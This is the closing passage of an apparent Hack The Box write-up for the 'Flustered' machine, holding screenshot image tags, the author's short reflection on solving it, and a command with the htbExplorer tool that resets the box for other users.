; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_77.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_78.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> It was a box that took me a long time to solve, because I had to do a lot of research and learn to correct many errors in the execution of the program. But all the time invested, I am learning a little more of the dynamics when trying to solve boxes in **Hack The Box**. In order for another user to access the box, I'm going to kill it with `htbExplorer`

```bash
./htbExplorer -k Flustered
```
